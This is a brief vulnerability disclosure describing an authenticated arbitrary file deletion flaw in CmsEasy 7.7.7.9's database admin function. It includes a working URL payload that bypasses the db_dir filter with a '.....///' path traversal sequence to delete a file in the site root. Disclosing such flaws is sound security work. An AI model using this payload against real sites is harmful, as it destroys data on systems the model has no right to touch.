

CmsEasy 7.7.7.9 has a background arbitrary file deletion vulnerability

The dedetedir_action function in the lib/admin/database_admin.php path has any deletion vulnerability, and you need to log in to the background.

![image-20240406225733913](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/cmseasy1.png)

The unlink function deletes any file

Controllable db dir parameter with filter

![image-20240406225819171](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/cmseasy2.png)

But the filtering is not strict and can be bypassed

Create a new txt file in the site root directory

![image-20240406225910682](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/cmseasy3.png)

payload is:

```
http://localhost:7080/index.php?case=database&act=deletedir&admin_dir=admin&site=default&db_dir=backup_/.....///.....///.....///1.txt
```

1.txt is deleted after the payload is executed